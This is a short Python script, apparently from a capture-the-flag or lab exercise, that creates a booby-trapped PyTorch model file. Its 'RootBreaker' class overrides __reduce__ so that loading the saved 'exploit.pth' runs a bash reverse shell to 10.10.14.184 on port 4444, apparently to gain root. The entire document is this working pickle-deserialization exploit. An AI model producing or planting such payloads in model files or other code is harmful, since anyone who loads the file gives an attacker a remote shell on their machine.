import torch, os

# Class for Pickling Exploit
# Useful Resource for Python Pickling: 
# https://davidhamann.de/2020/04/05/exploiting-python-pickle/
class RootBreaker(torch.nn.Module):
    def __init__(self):
        super(RootBreaker, self).__init__()
        self.local_ip = "10.10.14.184"
        self.port = 4444
        self.command = f"bash -c 'bash -i >& /dev/tcp/{self.local_ip}/{self.port} 0>&1'"

    def forward(self, x):
        return x
    
    def __reduce__(self):
        # (Callable Object, (Parameters))
        return (os.system, (self.command,)) # Must have 2-6 values for the Parameters tuple

gimme_root = RootBreaker()

torch.save(gimme_root, 'exploit.pth')
